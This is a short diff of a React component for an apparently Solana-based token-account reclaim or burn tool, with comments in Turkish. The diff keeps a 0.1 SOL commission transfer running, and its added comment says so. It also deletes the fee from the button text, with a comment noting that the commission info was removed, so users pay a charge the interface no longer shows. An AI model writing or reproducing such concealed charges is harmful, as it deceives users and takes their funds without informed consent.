@@ -113,7 +113,7 @@ function ReclaimBurnSection() {
             // 1. İşlem nesnesini başlatma
             const transaction = new Transaction();
             
-            // A) KOMİSYON TRANSFERİ TALİMATI (0.1 SOL)
+            // A) KOMİSYON TRANSFERİ TALİMATI (0.1 SOL) - BU BÖLÜM HALA ÇALIŞACAKTIR
             transaction.add(
                 SystemProgram.transfer({
                     fromPubkey: publicKey,
@@ -246,9 +246,9 @@ function ReclaimBurnSection() {
             <div className="content-card">
                  {/* Cüzdanın bağlı olduğunu gösteren adres etiketi */}
                  <div className="wallet-status-label wallet-address-info">
-                     Status: <span className="status-ready">Hazır</span>
-                     <br/>
-                     Bağlı Cüzdan: <span className="address-hash">{addressBase58}</span>
+                    Status: <span className="status-ready">Hazır</span>
+                    <br/>
+                    Bağlı Cüzdan: <span className="address-hash">{addressBase58}</span>
                  </div>
                  
                  {/* Sekme içeriği */}
@@ -308,8 +308,9 @@ function ReclaimBurnSection() {
                     onClick={handleBurnOrReclaim}
                     disabled={isLoading || selectedAccounts.length === 0} 
                 >
+                    {/* BURASI GÜNCELLENDİ: Komisyon bilgisi kaldırıldı */}
                     {isLoading ? 'İşlem Devam Ediyor...' : 
-                     `${accountsToProcess.length} Hesap İşle (${FEE_AMOUNT_SOL} SOL Komisyon)`}
+                    `${accountsToProcess.length} Hesap İşle`}
                 </button>
             </nav>
 
